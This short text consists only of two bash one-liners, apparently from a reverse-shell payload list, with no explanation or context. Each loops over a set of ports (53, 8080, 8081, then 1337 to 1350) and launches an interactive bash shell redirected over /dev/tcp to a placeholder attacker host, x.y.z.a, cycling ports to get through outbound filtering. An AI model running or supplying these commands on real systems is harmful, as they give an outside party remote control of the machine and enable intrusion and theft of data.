for p in 53 8080 8081; do bash -i >& /dev/tcp/x.y.z.a/$p 0>&1; done
for p in {1337..1350}; do bash -i >& /dev/tcp/x.y.z.a/$p 0>&1; done
